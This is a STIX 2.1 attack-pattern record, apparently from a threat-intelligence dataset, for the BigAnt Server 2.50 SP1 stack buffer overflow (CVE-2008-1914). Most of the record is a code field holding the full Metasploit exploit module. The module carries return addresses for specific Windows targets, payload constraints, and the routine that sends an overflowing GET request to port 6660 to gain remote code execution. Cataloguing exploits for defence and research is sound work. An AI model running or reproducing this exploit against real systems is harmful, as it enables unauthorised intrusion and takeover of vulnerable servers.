{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e8e34c0a-eec8-40f9-9633-3e5862fb2385",
    "created": "2024-08-14T16:46:44.866945Z",
    "modified": "2024-08-14T16:46:44.866949Z",
    "name": "BigAnt Server 2.50 SP1 Buffer Overflow",
    "description": " This exploits a stack buffer overflow in the BigAnt Messaging Service part of the BigAnt Server product suite. This module was tested successfully against version 2.50 SP1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bigant_server_250.rb",
            "external_id": "bigant_server_250.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1914"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BigAnt Server 2.50 SP1 Buffer Overflow',\n      'Description'    => %q{\n        This exploits a stack buffer overflow in the BigAnt Messaging Service,\n        part of the BigAnt Server product suite. This module was tested\n        successfully against version 2.50 SP1.\n      },\n      'Author' \t => [ 'Dr_IDE <Dr_IDE[at]hushmail.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # It's not clear if these are correct - there was a fix for\n          # the v2.2 vuln back in Dec 2008\n          [ 'CVE', '2008-1914'],\n          [ 'OSVDB', '44454'],\n          [ 'EDB', '9673' ],\n          [ 'EDB', '9690' ]\n          #[ 'B_ID', '28795' ],\n          #[ 'U_RL', 'http://www.milw0rm.com/exploits/5451'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 710,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'  =>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'BigAnt 2.5 Universal',\t\t{ 'Ret' => 0x0f9a196a } ], # Tested OK (Dr_IDE & aushack) p/p/r VBAJET32.dll xpsp3 & w2k\n          [ 'Windows 2000 Pro All English',   \t{ 'Ret' => 0x75022ac4 } ], # p/p/r Tested OK (aushack 20090918)\n          [ 'Windows XP Pro SP0/SP1 English', \t{ 'Ret' => 0x71aa32ad } ], # Should Work\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-04-15'))\n\n    register_options([Opt::RPORT(6660)])\n  end\n\n  def exploit\n    connect\n\n    sploit = \"GET \" + rand_text_alpha_upper(985) + generate_seh_payload(target.ret)\n    sploit << rand_text_alpha_upper(1000 - payload.encoded.length)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-04-15",
    "x_mitre_platforms": [
        "win'"
    ]
}